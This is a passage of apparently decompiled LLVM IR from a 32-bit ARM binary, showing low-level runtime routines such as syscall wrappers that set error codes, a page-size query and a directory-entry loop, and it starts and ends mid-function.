dec_label_pc_ef68:                                ; preds = %dec_label_pc_ef60
  %v2_ef68 = icmp ne i32 %v1_ef60, 0
  store i1 %v2_ef68, i1* %cpsr_c.global-to-local, align 1
  %v7_ef68 = icmp eq i32 %v1_ef60, 1
  store i1 %v7_ef68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef68, label %dec_label_pc_efa8, label %dec_label_pc_ef70

dec_label_pc_ef70:                                ; preds = %dec_label_pc_ef68
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_efa8

dec_label_pc_efa8:                                ; preds = %dec_label_pc_ef68, %dec_label_pc_ef70, %dec_label_pc_eec0
  %storemerge2 = phi i32 [ %v0_ef04, %dec_label_pc_eec0 ], [ 0, %dec_label_pc_ef70 ], [ 0, %dec_label_pc_ef68 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_efac = call i32 @function_d7fc(i32 %storemerge2)
  store i32 %v1_efac, i32* %r0.global-to-local, align 4
  %v0_efb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_efb0, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_efa8
  %v2_efb4 = load i32, i32* @r8, align 4
  %v8_efb4 = shl i32 %v2_efb4, %v1_efac
  %v9_efb4 = and i32 %v8_efb4, %v1_efac
  %v8_efb8 = lshr i32 %v2_efb4, %v9_efb4
  %v2_efbc = load i32, i32* %r4.global-to-local, align 4
  %v5_efbc = sdiv i32 %v2_efbc, 32768
  %v9_efb8 = and i32 %v5_efbc, %v9_efb4
  %v6_efbc = and i32 %v9_efb8, %v8_efb8
  %v3_efc0 = mul i32 %v6_efbc, %v2_efbc
  %v3_efc8 = load i32, i32* %r1.global-to-local, align 4
  %v8_efc8 = shl i32 %v2_efbc, %v3_efc8
  %v5_efcc = udiv i32 %v2_efbc, 2
  %v9_efc8 = and i32 %v8_efc8, %v5_efcc
  %v6_efcc = and i32 %v9_efc8, %v3_efc0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_efcc, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_efa8, %bb85
  %v5_efd0 = phi i32 [ %v1_efac, %dec_label_pc_efa8 ], [ %v6_efcc, %bb85 ]
  ret i32 %v5_efd0

; uselistorder directives
  uselistorder i32 %v2_efbc, { 0, 3, 2, 1 }
  uselistorder i32 %v1_efac, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_ef60, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ef5c, { 1, 0, 2 }
  uselistorder i32 %v1_ef40.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_ef2c, { 1, 0 }
  uselistorder i32 %v2_ee8c, { 1, 0 }
  uselistorder i32 %v2_ee64.pre, { 2, 0, 1 }
  uselistorder i32 %v1_ee58, { 1, 0 }
  uselistorder i32 %v1_ee54, { 3, 2, 1, 0 }
  uselistorder i32 %v1_ee48, { 1, 0 }
  uselistorder i32 %v1_ee14, { 1, 0 }
  uselistorder i32 %v1_ee10, { 1, 2, 3, 0 }
  uselistorder i32 %v1_ee04, { 1, 0 }
  uselistorder i32 %v2_ede0, { 1, 0, 2 }
  uselistorder i32 %v4_edc4, { 1, 0, 2 }
  uselistorder i32 %v4_edb4, { 1, 0, 2, 3 }
  uselistorder i1 %v8_ecfc, { 1, 2, 0 }
  uselistorder i32 %v2_ecc8, { 1, 2, 0 }
  uselistorder i32 %v1_ecc4, { 1, 2, 0 }
  uselistorder i1 %v2_ecb0, { 1, 0, 2 }
  uselistorder i32 %v5_ecb4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_ec80, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ec68, { 1, 0, 2 }
  uselistorder i32 %v2_ec5c, { 1, 0, 2 }
  uselistorder i32 %v3_ec2c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 2, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 23, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 0, 2, 3, 17, 18, 19, 1 }
  uselistorder i32* %r0.global-to-local, { 7, 3, 8, 9, 10, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 20, 22, 21, 23, 24, 4, 2, 25, 26, 1, 27, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 5, 1, 2, 3, 4, 0, 6, 7, 8, 9, 23, 10, 11, 14, 12, 13, 16, 17, 18, 19, 20, 21, 22, 25, 24, 15, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 11, 10, 17, 12, 14, 13, 18, 15, 16, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 19, 30 }
  uselistorder i32 (i32)* @function_d7fc, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_eb64, { 2, 1, 0 }
  uselistorder i32 536870912, { 2, 0, 1 }
  uselistorder i32 120, { 0, 2, 1, 4, 3 }
  uselistorder i32 1988, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_efa8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ef60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ef48, { 1, 0 }
  uselistorder label %dec_label_pc_eeb0, { 1, 0 }
  uselistorder label %dec_label_pc_ee88, { 1, 0 }
  uselistorder label %dec_label_pc_ee04, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ed80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ed58, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_ecc8, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_ecb0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @function_effc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_effc:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_effc = load i32, i32* @r4, align 4
  store i32 %v3_effc, i32* %stack_var_-16, align 4
  %v3_f008 = urem i32 %arg3, 4096
  %v2_f00c = icmp eq i32 %v3_f008, 0
  br i1 %v2_f00c, label %dec_label_pc_f030, label %dec_label_pc_f014

dec_label_pc_f014:                                ; preds = %dec_label_pc_effc
  %v0_f018 = call i32 @function_f150()
  store i32 %v0_f018, i32* %r0.global-to-local, align 4
  %v3_f01c = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_f01c = sext i16 %v3_f01c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_f028 = add i32 %v4_f01c, %v0_f018
  %v4_f028 = inttoptr i32 %v3_f028 to i32*
  store i32 22, i32* %v4_f028, align 4
  %v0_f064.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f064

dec_label_pc_f030:                                ; preds = %dec_label_pc_effc
  %v0_f040 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f040, -4095
  br i1 %tmp, label %dec_label_pc_f060, label %dec_label_pc_f048

dec_label_pc_f048:                                ; preds = %dec_label_pc_f030
  %v1_f04c = sub i32 0, %v0_f040
  %v3_f050 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_f050 = sext i16 %v3_f050 to i32
  %v0_f054 = call i32 @function_f150()
  %v3_f058 = add i32 %v4_f050, %v0_f054
  %v4_f058 = inttoptr i32 %v3_f058 to i32*
  store i32 %v1_f04c, i32* %v4_f058, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f060

dec_label_pc_f060:                                ; preds = %dec_label_pc_f030, %dec_label_pc_f048
  %v0_f060 = phi i32 [ %v0_f040, %dec_label_pc_f030 ], [ -1, %dec_label_pc_f048 ]
  store i32 %v0_f060, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f064

dec_label_pc_f064:                                ; preds = %dec_label_pc_f014, %dec_label_pc_f060
  %v0_f064 = phi i32 [ %v0_f064.pre, %dec_label_pc_f014 ], [ %v0_f060, %dec_label_pc_f060 ]
  store i32 %v0_f064, i32* %r0.global-to-local, align 4
  %v2_f068 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f068, i32* @r4, align 4
  ret i32 %v0_f064

; uselistorder directives
  uselistorder i32 %v0_f064, { 1, 0 }
  uselistorder i32 %v0_f040, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_f064, { 1, 0 }
  uselistorder label %dec_label_pc_f060, { 1, 0 }
}

define i32 @function_f078() local_unnamed_addr {
dec_label_pc_f078:
  %stack_var_-4 = alloca i32, align 4
  %v0_f078 = load i32, i32* @lr, align 4
  store i32 %v0_f078, i32* %stack_var_-4, align 4
  %v0_f080 = load i32, i32* @r0, align 4
  %v3_f084 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_f084 = sext i16 %v3_f084 to i32
  store i32 %v4_f084, i32* @r2, align 4
  %v0_f088 = call i32 @function_f150()
  %v1_f08c = sub i32 0, %v0_f080
  store i32 %v1_f08c, i32* @r3, align 4
  %v2_f090 = load i32, i32* @r2, align 4
  %v3_f090 = add i32 %v2_f090, %v0_f088
  %v4_f090 = inttoptr i32 %v3_f090 to i32*
  store i32 %v1_f08c, i32* %v4_f090, align 4
  %v2_f098 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_f098, i32* @lr, align 4
  ret i32 -1
}

define i32 @function_f0a4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f0a4:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f0a4 = load i32, i32* @r4, align 4
  %v2_f0ac = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_f0ac, label %dec_label_pc_f100, label %dec_label_pc_f0c4

dec_label_pc_f0c4:                                ; preds = %dec_label_pc_f0a4
  %v1_f0c4 = add i32 %arg2, 4
  %v2_f0c4 = inttoptr i32 %v1_f0c4 to i32*
  %v3_f0c4 = load i32, i32* %v2_f0c4, align 4
  %v1_f0c8 = and i32 %v3_f0c4, 67108864
  %v2_f0c8 = icmp eq i32 %v1_f0c8, 0
  br i1 %v2_f0c8, label %dec_label_pc_f0d0, label %dec_label_pc_f100

dec_label_pc_f0d0:                                ; preds = %dec_label_pc_f0c4
  store i32 20, i32* @r2, align 4
  %v2_f0d4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_f0d4, i32* @r0, align 4
  %v0_f0d8 = call i32 @function_bfd0()
  %v0_f100.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_f108.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f100

dec_label_pc_f100:                                ; preds = %dec_label_pc_f0c4, %dec_label_pc_f0a4, %dec_label_pc_f0d0
  %v0_f108 = phi i32 [ %arg3, %dec_label_pc_f0c4 ], [ %arg3, %dec_label_pc_f0a4 ], [ %v0_f108.pre, %dec_label_pc_f0d0 ]
  %v0_f104 = phi i32 [ %arg2, %dec_label_pc_f0c4 ], [ 0, %dec_label_pc_f0a4 ], [ %v2_f0d4, %dec_label_pc_f0d0 ]
  %v0_f100 = phi i32 [ %arg1, %dec_label_pc_f0c4 ], [ %arg1, %dec_label_pc_f0a4 ], [ %v0_f100.pre, %dec_label_pc_f0d0 ]
  %v4_f110 = call i32 @function_f160(i32 %v0_f100, i32 %v0_f104, i32 %v0_f108, i32 8)
  store i32 %v3_f0a4, i32* @r4, align 4
  ret i32 %v4_f110

; uselistorder directives
  uselistorder i32 67108864, { 1, 0 }
  uselistorder label %dec_label_pc_f100, { 2, 0, 1 }
}

define i32 @function_f124(i32 %arg1) local_unnamed_addr {
dec_label_pc_f124:
  %v0_f124 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f124, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f124
  %v2_f124 = load i32, i32* @r8, align 4
  %v4_f124 = mul i32 %v2_f124, 2
  %v5_f124 = and i32 %v4_f124, %arg1
  %v2_f128 = load i32, i32* @ip, align 4
  %v4_f128 = lshr i32 %v2_f128, %v5_f124
  %v5_f128 = sub i32 32, %v5_f124
  %v6_f128 = shl i32 %v2_f128, %v5_f128
  %v7_f128 = or i32 %v6_f128, %v4_f128
  %v9_f128 = and i32 %v7_f128, %v5_f124
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f124, %bb
  %v10_f128 = phi i32 [ %arg1, %dec_label_pc_f124 ], [ %v9_f128, %bb ]
  ret i32 %v10_f128

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_f12c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f12c:
  store i32 0, i32* @r1, align 4
  %v0_f130 = call i32 @function_12064()
  ret i32 %v0_f130
}

define i32 @function_f150() local_unnamed_addr {
dec_label_pc_f150:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @function_f160(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_f160:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f160 = load i32, i32* @r7, align 4
  store i32 %v3_f160, i32* %stack_var_-8, align 4
  %v0_f16c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f16c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f16c, -4095
  br i1 %tmp, label %dec_label_pc_f194, label %dec_label_pc_f17c

dec_label_pc_f17c:                                ; preds = %dec_label_pc_f160
  %v0_f180 = call i32 @function_f150()
  %v3_f184 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_f184 = sext i16 %v3_f184 to i32
  %v0_f188 = load i32, i32* %r2.global-to-local, align 4
  %v1_f188 = sub i32 0, %v0_f188
  store i32 %v1_f188, i32* %r2.global-to-local, align 4
  %v3_f18c = add i32 %v4_f184, %v0_f180
  %v4_f18c = inttoptr i32 %v3_f18c to i32*
  store i32 %v1_f188, i32* %v4_f18c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f194.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f194

dec_label_pc_f194:                                ; preds = %dec_label_pc_f160, %dec_label_pc_f17c
  %v1_f198 = phi i32 [ %v0_f16c, %dec_label_pc_f160 ], [ -1, %dec_label_pc_f17c ]
  %v2_f194 = phi i32 [ %v3_f160, %dec_label_pc_f160 ], [ %v2_f194.pre, %dec_label_pc_f17c ]
  store i32 %v2_f194, i32* @r7, align 4
  ret i32 %v1_f198

; uselistorder directives
  uselistorder i32 %v0_f16c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f194, { 1, 0 }
}

define i32 @function_f1a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_f1a0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f1ac

dec_label_pc_f1ac:                                ; preds = %dec_label_pc_f1d8, %dec_label_pc_f1ec, %dec_label_pc_f1a0
  %v0_f1ac = phi i32 [ %arg1, %dec_label_pc_f1a0 ], [ %v0_f1ac.pre.pre, %dec_label_pc_f1ec ], [ %v0_f1d8, %dec_label_pc_f1d8 ]
  store i32 %v0_f1ac, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f1ac, -4095
  br i1 %tmp, label %dec_label_pc_f1d8, label %dec_label_pc_f1c8

dec_label_pc_f1c8:                                ; preds = %dec_label_pc_f1ac
  %v0_f1c8 = call i32 @function_f150()
  %v0_f1cc = load i32, i32* %r2.global-to-local, align 4
  %v1_f1cc = sub i32 0, %v0_f1cc
  store i32 %v1_f1cc, i32* %r2.global-to-local, align 4
  %v3_f1d0 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_f1d0 = sext i16 %v3_f1d0 to i32
  %v3_f1d4 = add i32 %v4_f1d0, %v0_f1c8
  %v4_f1d4 = inttoptr i32 %v3_f1d4 to i32*
  store i32 %v1_f1cc, i32* %v4_f1d4, align 4
  %v0_f1d8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f1d8

dec_label_pc_f1d8:                                ; preds = %dec_label_pc_f1ac, %dec_label_pc_f1c8
  %v0_f1d8 = phi i32 [ %v0_f1ac, %dec_label_pc_f1ac ], [ %v0_f1d8.pre, %dec_label_pc_f1c8 ]
  store i32 %v0_f1d8, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_f1d8, -4095
  br i1 %tmp4, label %dec_label_pc_f1ac, label %dec_label_pc_f1ec

dec_label_pc_f1ec:                                ; preds = %dec_label_pc_f1d8
  %v0_f1ec = call i32 @function_f150()
  %v0_f1f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f1f0 = sub i32 0, %v0_f1f0
  store i32 %v1_f1f0, i32* %r2.global-to-local, align 4
  %v3_f1f4 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_f1f4 = sext i16 %v3_f1f4 to i32
  %v3_f1f8 = add i32 %v4_f1f4, %v0_f1ec
  %v4_f1f8 = inttoptr i32 %v3_f1f8 to i32*
  store i32 %v1_f1f0, i32* %v4_f1f8, align 4
  %v0_f1ac.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f1ac

; uselistorder directives
  uselistorder i32 %v0_f1d8, { 0, 2, 1 }
  uselistorder i32 %v0_f1ac, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 4, 5, 0, 2, 3 }
  uselistorder label %dec_label_pc_f1d8, { 1, 0 }
  uselistorder label %dec_label_pc_f1ac, { 1, 0, 2 }
}

define i32 @function_f208() local_unnamed_addr {
dec_label_pc_f208:
  %r7.global-to-local = alloca i32, align 4
  %v0_f210 = load i32, i32* @r1, align 4
  store i32 %v0_f210, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_f220 = load i32, i32* @r0, align 4
  store i32 %v0_f220, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_f220, -4095
  br i1 %tmp, label %dec_label_pc_f248, label %dec_label_pc_f22c

dec_label_pc_f22c:                                ; preds = %dec_label_pc_f208
  %v0_f230 = call i32 @function_f150()
  %v3_f234 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_f234 = sext i16 %v3_f234 to i32
  store i32 %v4_f234, i32* @r3, align 4
  %v0_f238 = load i32, i32* @r2, align 4
  %v1_f238 = sub i32 0, %v0_f238
  store i32 %v1_f238, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_f240 = add i32 %v4_f234, %v0_f230
  %v4_f240 = inttoptr i32 %v3_f240 to i32*
  store i32 %v1_f238, i32* %v4_f240, align 4
  br label %dec_label_pc_f258

dec_label_pc_f248:                                ; preds = %dec_label_pc_f208
  store i32 %v0_f220, i32* %r7.global-to-local, align 4
  %v2_f248 = icmp eq i32 %v0_f220, 0
  br i1 %v2_f248, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f248
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f248, %bb
  call void @__pseudo_cond_branch(i1 %v2_f248, i32 ptrtoint (i32* @global_var_f67c.420 to i32))
  br label %dec_label_pc_f258

dec_label_pc_f258:                                ; preds = %dec_label_pc_f22c, %.thread
  %v0_f258 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_f258

; uselistorder directives
  uselistorder i32 %v0_f220, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f258, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_f26c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_f26c:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v18_f26c = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f2a4, label %dec_label_pc_f288

dec_label_pc_f288:                                ; preds = %dec_label_pc_f26c
  %v1_f28c = sub i32 0, %arg1
  %v3_f290 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_f290 = sext i16 %v3_f290 to i32
  store i32 %v4_f290, i32* %r3.global-to-local, align 4
  %v0_f294 = call i32 @function_f150()
  store i32 -1, i32* %r5.global-to-local, align 4
  %v3_f29c = add i32 %v4_f290, %v0_f294
  %v4_f29c = inttoptr i32 %v3_f29c to i32*
  store i32 %v1_f28c, i32* %v4_f29c, align 4
  br label %dec_label_pc_f2f8

dec_label_pc_f2a4:                                ; preds = %dec_label_pc_f26c
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_f2a4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_f2ac = add i32 %arg2, %arg1
  store i32 %v3_f2ac, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f2a4, %bb
  %v1_f2e84 = phi i32 [ %v18_f26c, %dec_label_pc_f2a4 ], [ %v3_f2ac, %bb ]
  %v0_f2e42 = phi i32 [ 141, %dec_label_pc_f2a4 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_f2f8, label %dec_label_pc_f2e4

dec_label_pc_f2b8:                                ; preds = %dec_label_pc_f2e4
  %v1_f2b8 = add i32 %v0_f2b8, 8
  %v2_f2b8 = inttoptr i32 %v1_f2b8 to i16*
  %v3_f2b8 = load i16, i16* %v2_f2b8, align 2
  %v4_f2b8 = zext i16 %v3_f2b8 to i32
  %v2_f2bc = add i32 %v4_f2b8, %v0_f2b8
  store i32 %v2_f2bc, i32* %r3.global-to-local, align 4
  %v1_f2c0 = add i32 %v2_f2bc, -1
  %v2_f2c0 = inttoptr i32 %v1_f2c0 to i8*
  %v3_f2c0 = load i8, i8* %v2_f2c0, align 1
  %v4_f2c0 = zext i8 %v3_f2c0 to i32
  store i32 %v4_f2c0, i32* @r4, align 4
  %v1_f2c4 = call i32 @function_114c0(i32 %v1_f2e4)
  %v0_f2c8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_f2c8, i32* @r1, align 4
  %v1_f2cc = add i32 %v1_f2c4, 1
  store i32 %v1_f2cc, i32* @r2, align 4
  %v0_f2d0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_f2d0, i32* @r0, align 4
  %v3_f2d4 = call i32 @function_bfe0(i32 %v0_f2d0, i32 %v0_f2c8, i32 %v1_f2cc)
  %v0_f2d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_f2d8 = add i32 %v0_f2d8, 8
  %v2_f2d8 = inttoptr i32 %v1_f2d8 to i16*
  %v3_f2d8 = load i16, i16* %v2_f2d8, align 2
  %v4_f2d8 = zext i16 %v3_f2d8 to i32
  store i32 %v4_f2d8, i32* %r3.global-to-local, align 4
  %v0_f2dc = load i32, i32* @r4, align 4
  %v1_f2dc = trunc i32 %v0_f2dc to i8
  %v3_f2dc = add i32 %v0_f2d8, 10
  %v4_f2dc = inttoptr i32 %v3_f2dc to i8*
  store i8 %v1_f2dc, i8* %v4_f2dc, align 1
  %v0_f2e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_f2e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_f2e0 = add i32 %v1_f2e0, %v0_f2e0
  store i32 %v2_f2e0, i32* %r7.global-to-local, align 4
  %v1_f2e8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_f2e4

dec_label_pc_f2e4:                                ; preds = %.thread, %dec_label_pc_f2b8
  %v1_f2e8 = phi i32 [ %v1_f2e8.pre, %dec_label_pc_f2b8 ], [ %v1_f2e84, %.thread ]
  %v0_f2b8 = phi i32 [ %v2_f2e0, %dec_label_pc_f2b8 ], [ %v0_f2e42, %.thread ]
  %v1_f2e4 = add i32 %v0_f2b8, 10
  store i32 %v1_f2e4, i32* %r6.global-to-local, align 4
  %v3_f2e8 = icmp ult i32 %v0_f2b8, %v1_f2e8
  %v1_f2f0 = add i32 %v0_f2b8, 11
  store i32 %v1_f2f0, i32* %r8.global-to-local, align 4
  br i1 %v3_f2e8, label %dec_label_pc_f2b8, label %dec_label_pc_f2f8

dec_label_pc_f2f8:                                ; preds = %dec_label_pc_f2e4, %.thread, %dec_label_pc_f288
  %v0_f2f8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v18_f26c, i32* @sl, align 4
  ret i32 %v0_f2f8

; uselistorder directives
  uselistorder i32 %v1_f2e4, { 1, 0 }
  uselistorder i32 %v0_f2b8, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_f26c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_bfe0, { 0, 3, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f2e4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_f30c() local_unnamed_addr {
dec_label_pc_f30c:
  %v1_f31c = load i32, i32* @r0, align 4
  ret i32 %v1_f31c
}

define i32 @function_f320() local_unnamed_addr {
dec_label_pc_f320:
  %v1_f330 = load i32, i32* @r0, align 4
  ret i32 %v1_f330
}

define i32 @function_f334(i32 %arg1) local_unnamed_addr {
dec_label_pc_f334:
  %v1_f344 = load i32, i32* @r0, align 4
  ret i32 %v1_f344
}

define i32 @function_f348() local_unnamed_addr {
dec_label_pc_f348:
  %v4_f354 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 148) to i32*), align 4
  %v1_f358 = inttoptr i32 %v4_f354 to i32*
  %v2_f358 = load i32, i32* %v1_f358, align 4
  %v2_f35c = icmp eq i32 %v2_f358, 0
  br i1 %v2_f35c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_f348
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_f348, %bb
  %v1_f364 = phi i32 [ %v2_f358, %dec_label_pc_f348 ], [ 4096, %bb ]
  ret i32 %v1_f364

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_f370(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f370:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f370 = load i32, i32* @r7, align 4
  store i32 %v3_f370, i32* %stack_var_-8, align 4
  %v0_f37c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f37c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f37c, -4095
  br i1 %tmp, label %dec_label_pc_f3a4, label %dec_label_pc_f38c

dec_label_pc_f38c:                                ; preds = %dec_label_pc_f370
  %v0_f390 = call i32 @function_f150()
  %v3_f394 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_f394 = sext i16 %v3_f394 to i32
